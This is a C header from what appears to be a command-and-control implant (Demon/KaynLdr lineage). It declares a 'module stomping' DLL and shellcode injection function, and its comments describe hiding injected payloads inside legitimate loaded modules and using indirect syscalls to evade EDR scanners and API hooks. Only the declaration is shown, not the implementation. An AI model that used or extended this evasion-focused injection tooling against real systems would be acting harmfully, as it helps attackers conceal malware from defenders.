#ifndef ARCHON_STOMP_H
#define ARCHON_STOMP_H

#include <Demon.h>
#include <inject/Inject.h>

/*!
 * ARC-05: Module-stomping reflective loader technique constant.
 *
 * When InjCtx.Technique == INJECTION_TECHNIQUE_MODULE_STOMP, DllInjectModuleStomp
 * is used instead of DllInjectReflective.  The payload bytes are written into an
 * existing, file-backed DLL mapping in the target process rather than a new
 * anonymous MEM_PRIVATE allocation, so the memory region continues to appear as
 * a legitimate on-disk module to EDR memory scanners.
 *
 * Profile key: set Config.Inject.StompDll (WCHAR module name, e.g. L"WINMM.DLL")
 * to pin the victim module.  Leave NULL for automatic selection.
 */
#define INJECTION_TECHNIQUE_MODULE_STOMP  4

/*!
 * Inject a DLL (or KaynLdr-prepended shellcode) into a remote process by stomping
 * an existing loaded module's memory pages.  All write operations use indirect
 * NT syscalls (DX_MEM_SYSCALL) to avoid Win32 API hooks.
 *
 * @param hTargetProcess  Handle to the target process.
 * @param DllLdr          KaynLdr stub (used if DllBuffer has no reflective loader).
 * @param DllLdrSize      Size of the KaynLdr stub in bytes.
 * @param DllBuffer       DLL (or shellcode) bytes to inject.
 * @param DllLength       Size of DllBuffer in bytes.
 * @param Parameter       Optional argument buffer forwarded to the entry point.
 * @param ParamSize       Size of Parameter in bytes.
 * @param ctx             Injection context (receives ctx->Parameter on success).
 * @return                0 on success, INJECT_ERROR_* or Windows error code on failure.
 */
DWORD DllInjectModuleStomp(
    IN HANDLE         hTargetProcess,
    IN LPVOID         DllLdr,
    IN DWORD          DllLdrSize,
    IN LPVOID         DllBuffer,
    IN DWORD          DllLength,
    IN PVOID          Parameter,
    IN SIZE_T         ParamSize,
    IN PINJECTION_CTX ctx
);

#endif /* ARCHON_STOMP_H */
